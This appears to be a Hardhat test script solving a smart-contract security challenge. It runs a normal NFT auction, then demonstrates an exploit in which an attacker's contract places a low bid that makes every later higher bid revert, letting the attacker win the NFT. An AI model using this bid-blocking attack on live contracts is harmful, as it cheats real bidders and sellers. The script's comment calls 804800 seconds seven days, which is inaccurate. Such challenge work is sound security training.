const { expect } = require("chai");
const { ethers } = require("hardhat");
const { blockchainNow, setBlockchainTime, parseEth } = require("./utils/helpers.js");

async function deploy(deployer) {
    const Mock721 = await ethers.getContractFactory("MockERC721", deployer);

    const Auction = await ethers.getContractFactory("Auction", deployer);
    const auction = await Auction.deploy();

    let mock721ContractAddr = await auction.nftContract();
    const mock721 = await Mock721.attach(mock721ContractAddr);

    return [mock721, auction];
}

async function main() {
    console.log("\n CHALLENGE - 4\n");
    let [deployer, minter, bidder1, bidder2, attacker] = await ethers.getSigners();
    let [mock721, auction] = await deploy(deployer);

    // Workflow

    let tokenId = 0;

    tx = await auction.connect(minter).list({ value: parseEth("1", "ether") });
    await expect(tx).to.emit(auction, "ListedId").withArgs(tokenId, minter.address);

    tx = await auction.connect(bidder1).bid(tokenId, { value: parseEth("2", "ether") });
    await expect(tx).to.emit(auction, "BidId").withArgs(tokenId, bidder1.address, parseEth("2", "ether"));

    tx = await auction.connect(bidder2).bid(tokenId, { value: parseEth("3", "ether") });
    await expect(tx).to.emit(auction, "BidId").withArgs(tokenId, bidder2.address, parseEth("3", "ether"));

    // time travel till 7 days elapse
    await setBlockchainTime((await blockchainNow()) + 804800);
    tx = await auction.connect(bidder2).collect(tokenId);
    await expect(tx).to.emit(auction, "TransferId").withArgs(tokenId, minter.address, bidder2.address);

    // POC goes here:
    tokenId++;
    console.log("\n EXPLOIT : \n");

    console.log("Mint a new NFT");
    tx = await auction.connect(minter).list({ value: parseEth("1", "ether") });
    await expect(tx).to.emit(auction, "ListedId").withArgs(tokenId, minter.address);
    console.log("The initial owner of NFT #", tokenId, "is", await mock721.ownerOf(tokenId));

    let balance = await attacker.getBalance();
    balance = ethers.utils.formatUnits(balance, "ether");
    console.log("The attacker's initial balance is: ", balance, "ETH");
    console.log("Attacker address:", attacker.address, "deploys a corrupt contract with enough ETH to make a bid.");
    const AuctionAttack = await ethers.getContractFactory("AuctionAttack", attacker);
    const auctionAttack = await AuctionAttack.deploy(auction.address, { value: parseEth("1.5", "ether") });

    console.log("The attacker's contract makes the lowest bid.");
    tx = await auctionAttack.bid(tokenId);

    console.log("bidder1's high bid is expected to fail.");
    await expect(auction.connect(bidder1).bid(tokenId, { value: parseEth("2", "ether") })).to.be.reverted;

    console.log("bidder2's higher bid also fails.");    
    await expect(auction.connect(bidder2).bid(tokenId, { value: parseEth("3", "ether") })).to.be.reverted;

    console.log("Fast forward 7 days, it is NFT collection time!"); 
    // fast forward blockchain time by 7 days
    await ethers.provider.send("evm_mine", [(await blockchainNow()) + 804800]); 
    tx = await auctionAttack.collect(tokenId);
    await expect(tx).to.emit(auction, "TransferId").withArgs(tokenId, minter.address, auctionAttack.address);

    console.log("Now the NFT owner is ", await mock721.ownerOf(tokenId));

    balance = await attacker.getBalance();
    balance = ethers.utils.formatUnits(balance, "ether");
    console.log("The attacker's final balance is: ", balance);
}

main();
